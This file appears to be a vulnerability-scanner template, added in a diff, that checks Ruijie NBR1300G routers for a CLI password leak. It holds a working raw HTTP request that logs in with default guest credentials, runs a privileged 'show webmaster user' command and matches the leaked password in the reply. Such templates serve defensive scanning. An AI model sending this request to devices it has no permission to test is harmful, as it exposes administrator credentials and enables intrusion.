@@ -1,0 +1,144 @@
+{
+  "id": "ruijie-nbr1300g-exposure",
+  "name": "Ruijie NBR1300G Cli Password Leak - Detect",
+  "author": "pikpikcu",
+  "severity": "HIGH",
+  "description": "Ruijie NBR1300G CLI password leak vulnerability was detected.",
+  "references": [
+    "http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%201300G%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%B6%8A%E6%9D%83CLI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html",
+    "https://www.ruijienetworks.com"
+  ],
+  "tags": [
+    "ruijie",
+    "exposure"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-200",
+  "cvssScore": "7.5",
+  "cvssMetrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /WEB_VMS/LEVEL15/ HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic Z3Vlc3Q6Z3Vlc3Q\u003d\n\ncommand\u003dshow webmaster user\u0026strurl\u003dexec%04\u0026mode\u003d%02PRIV_EXEC\u0026signname\u003dRed-Giant.\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "webmaster level 2 username guest password guest"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "ruijie-nbr1300g-exposure",
+    "info": {
+      "name": "Ruijie NBR1300G Cli Password Leak - Detect",
+      "author": "pikpikcu",
+      "severity": "high",
+      "description": "Ruijie NBR1300G CLI password leak vulnerability was detected.",
+      "reference": [
+        "http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%201300G%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%B6%8A%E6%9D%83CLI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html",
+        "https://www.ruijienetworks.com"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "cvss_score": "7.5",
+        "cwe_id": "CWE-200"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "ruijie,exposure"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /WEB_VMS/LEVEL15/ HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic Z3Vlc3Q6Z3Vlc3Q\u003d\n\ncommand\u003dshow webmaster user\u0026strurl\u003dexec%04\u0026mode\u003d%02PRIV_EXEC\u0026signname\u003dRed-Giant.\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "webmaster level 2 username guest password guest"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
